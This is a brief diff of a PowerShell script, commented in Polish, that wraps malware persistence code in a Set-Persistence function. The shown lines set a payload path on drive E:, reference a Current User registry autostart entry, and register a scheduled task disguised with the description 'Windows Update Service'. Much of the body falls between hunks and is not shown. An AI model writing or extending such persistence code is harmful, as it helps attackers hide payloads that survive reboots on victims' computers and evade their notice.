@@ -1,4 +1,5 @@
-# Rejestracja autostartu w 3 lokalizacjach
+function Set-Persistence {
+   # Rejestracja autostartu w 3 lokalizacjach
 $payloadPath = "E:\$payloadName"
 
 # 1. Rejestr (Current User)
@@ -20,3 +21,6 @@ Register-ScheduledTask -Action $action -Trigger $trigger `
     -Description "Windows Update Service" `
     -User $env:USERNAME `
     -Force
+
+    $payloadPath = "E:\$payloadName"
+}
